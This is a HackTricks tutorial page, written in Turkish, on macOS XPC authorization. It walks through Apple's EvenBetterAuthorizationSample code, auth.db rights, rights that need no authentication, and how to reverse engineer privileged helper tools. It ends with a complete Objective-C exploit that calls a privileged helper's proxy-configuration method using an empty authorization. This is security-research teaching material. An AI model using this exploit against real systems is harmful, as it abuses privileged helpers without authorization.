# macOS XPC Authorization

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## XPC Authorization

Apple, bağlanan işlemin **açık bir XPC yöntemini çağırma izinlerine sahip olup olmadığını** doğrulamak için başka bir yol önerir.

Bir uygulama **ayrılmış bir kullanıcı olarak eylemler gerçekleştirmesi** gerektiğinde, genellikle uygulamayı ayrıcalıklı bir kullanıcı olarak çalıştırmak yerine, bu eylemleri gerçekleştirmek için uygulamadan çağrılabilecek bir XPC hizmeti olarak root olarak bir HelperTool yükler. Ancak, hizmeti çağıran uygulamanın yeterli yetkilendirmeye sahip olması gerekir.

### ShouldAcceptNewConnection her zaman EVET

Bir örnek [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample) içinde bulunabilir. `App/AppDelegate.m` dosyasında **HelperTool** ile **bağlanmaya** çalışır. Ve `HelperTool/HelperTool.m` dosyasında **`shouldAcceptNewConnection`** **daha önce belirtilen** gereksinimlerin hiçbirini **kontrol etmeyecek**. Her zaman EVET döndürecektir:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Daha fazla bilgi için bu kontrolü doğru bir şekilde yapılandırma hakkında:

{% content-ref url="macos-xpc-connecting-process-check/" %}
[macos-xpc-connecting-process-check](macos-xpc-connecting-process-check/)
{% endcontent-ref %}

### Uygulama hakları

Ancak, **HelperTool'dan bir yöntem çağrıldığında bazı yetkilendirmeler gerçekleşiyor**.

`App/AppDelegate.m` dosyasındaki **`applicationDidFinishLaunching`** fonksiyonu, uygulama başlatıldıktan sonra boş bir yetkilendirme referansı oluşturacaktır. Bu her zaman çalışmalıdır.\
Sonra, `setupAuthorizationRights` çağrısını yaparak o yetkilendirme referansına **bazı haklar eklemeye** çalışacaktır:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Fonksiyon `setupAuthorizationRights`, `Common/Common.m` dosyasından, uygulamanın haklarını `/var/db/auth.db` yetki veritabanında saklayacaktır. Veritabanında henüz bulunmayan hakları yalnızca ekleyeceğine dikkat edin:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Fonksiyon `enumerateRightsUsingBlock`, `commandInfo` içinde tanımlanan uygulama izinlerini almak için kullanılır:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Bu, bu sürecin sonunda `commandInfo` içinde belirtilen izinlerin `/var/db/auth.db` içinde saklanacağı anlamına gelir. **Kimlik doğrulama gerektiren** **her yöntem** için **izin adı** ve **`kCommandKeyAuthRightDefault`** bulabileceğinizi unutmayın. Sonuncusu **bu hakkı kimin alabileceğini gösterir**.

Bir hakkın kimler tarafından erişilebileceğini belirtmek için farklı kapsamlar vardır. Bunlardan bazıları [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity\_authorization/lib/AuthorizationDB.h) içinde tanımlanmıştır (hepsini [burada bulabilirsiniz](https://www.dssw.co.uk/reference/authorization-rights/)), ancak özet olarak:

<table><thead><tr><th width="284.3333333333333">Ad</th><th width="165">Değer</th><th>Açıklama</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Herkes</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Hiç kimse</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Mevcut kullanıcı bir admin olmalıdır (admin grubunda)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Kullanıcıdan kimlik doğrulaması yapması istenir.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Kullanıcıdan kimlik doğrulaması yapması istenir. Admin olmalıdır (admin grubunda)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Kural belirtin</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Hakkın üzerine bazı ek yorumlar belirtin</td></tr></tbody></table>

### Hakların Doğrulanması

`HelperTool/HelperTool.m` içinde **`readLicenseKeyAuthorization`** fonksiyonu, çağrının **böyle bir yöntemi** **çalıştırmak için yetkili olup olmadığını** kontrol eder ve **`checkAuthorization`** fonksiyonunu çağırır. Bu fonksiyon, çağıran süreç tarafından gönderilen **authData**'nın **doğru formatta** olup olmadığını kontrol eder ve ardından belirli bir yöntemi çağırmak için **neye ihtiyaç olduğunu** kontrol eder. Her şey yolunda giderse, **dönen `error` `nil` olacaktır**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Not edin ki, bu yöntemi çağırmak için gerekli olan **hakları kontrol etmek** amacıyla `authorizationRightForCommand` fonksiyonu sadece daha önceki yorum nesnesi **`commandInfo`**'yu kontrol edecektir. Ardından, fonksiyonu çağırmak için **haklara sahip olup olmadığını** kontrol etmek için **`AuthorizationCopyRights`** çağrılacaktır (bayrakların kullanıcı ile etkileşime izin verdiğini unutmayın).

Bu durumda, `readLicenseKeyAuthorization` fonksiyonunu çağırmak için `kCommandKeyAuthRightDefault` `@kAuthorizationRuleClassAllow` olarak tanımlanmıştır. Yani **herkes bunu çağırabilir**.

### DB Bilgisi

Bu bilginin `/var/db/auth.db` içinde saklandığı belirtilmiştir. Saklanan tüm kuralları listelemek için:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
O zaman, bu hakka kimin erişebileceğini şu şekilde okuyabilirsiniz:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### İzinler

**Tüm izin yapılandırmalarını** [**buradan**](https://www.dssw.co.uk/reference/authorization-rights/) bulabilirsiniz, ancak kullanıcı etkileşimi gerektirmeyen kombinasyonlar şunlardır:

1. **'authenticate-user': 'false'**
* Bu en doğrudan anahtardır. `false` olarak ayarlandığında, bir kullanıcının bu hakkı elde etmek için kimlik doğrulaması sağlaması gerekmediğini belirtir.
* Bu, aşağıdaki 2 anahtardan biriyle veya kullanıcının ait olması gereken bir grubu belirtmek için **birlikte kullanılır**.
2. **'allow-root': 'true'**
* Bir kullanıcı root kullanıcı olarak çalışıyorsa (yükseltilmiş izinlere sahipse) ve bu anahtar `true` olarak ayarlandıysa, root kullanıcı bu hakkı daha fazla kimlik doğrulaması olmadan elde edebilir. Ancak, genellikle root kullanıcı statüsüne ulaşmak zaten kimlik doğrulaması gerektirdiğinden, bu çoğu kullanıcı için "kimlik doğrulaması yok" senaryosu değildir.
3. **'session-owner': 'true'**
* `true` olarak ayarlandığında, oturumun sahibi (şu anda oturum açmış kullanıcı) otomatik olarak bu hakkı alır. Kullanıcı zaten oturum açmışsa, bu ek kimlik doğrulamasını atlayabilir.
4. **'shared': 'true'**
* Bu anahtar kimlik doğrulaması olmadan hak vermez. Bunun yerine, `true` olarak ayarlandığında, hak kimlik doğrulaması yapıldıktan sonra, her birinin yeniden kimlik doğrulaması yapmasına gerek kalmadan birden fazla süreç arasında paylaşılabileceği anlamına gelir. Ancak, hakkın başlangıçta verilmesi yine de kimlik doğrulaması gerektirecektir, aksi takdirde `'authenticate-user': 'false'` gibi diğer anahtarlarla birleştirilmelidir.

İlginç hakları elde etmek için [**bu betiği**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) kullanabilirsiniz:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
## Yetkilendirmeyi Tersine Çevirme

### EvenBetterAuthorization'ın Kullanılıp Kullanılmadığını Kontrol Etme

Eğer **`[HelperTool checkAuthorization:command:]`** fonksiyonunu bulursanız, muhtemelen süreç daha önce bahsedilen yetkilendirme şemasını kullanıyordur:

<figure><img src="../../../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

Bu durumda, eğer bu fonksiyon `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree` gibi fonksiyonları çağırıyorsa, [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154) kullanılıyor demektir.

Kullanıcı etkileşimi olmadan bazı ayrıcalıklı eylemleri çağırmak için izin almanın mümkün olup olmadığını görmek için **`/var/db/auth.db`** dosyasını kontrol edin.

### Protokol İletişimi

Sonra, XPC servisi ile iletişim kurabilmek için protokol şemasını bulmanız gerekiyor.

**`shouldAcceptNewConnection`** fonksiyonu, dışa aktarılan protokolü belirtir:

<figure><img src="../../../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

Bu durumda, EvenBetterAuthorizationSample'daki ile aynıyız, [**bu satıra bakın**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Kullanılan protokolün adını bilerek, **başlık tanımını dökme** işlemi yapmak mümkündür:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Son olarak, onunla iletişim kurmak için **açık Mach Servisinin adını** bilmemiz gerekiyor. Bunu bulmanın birkaç yolu vardır:

* **`[HelperTool init]`** içinde Mach Servisinin kullanıldığını görebilirsiniz:

<figure><img src="../../../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

* launchd plist içinde:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit Örneği

Bu örnekte oluşturulur:

* Fonksiyonlarla protokolün tanımı
* Erişim istemek için kullanılacak boş bir auth
* XPC servisine bir bağlantı
* Bağlantı başarılıysa fonksiyona bir çağrı
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Diğer XPC ayrıcalık yardımcıları kötüye kullanıldı

* [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm\_source=pocket\_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm\_source=pocket\_shared)

## Referanslar

* [https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/](https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/)

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
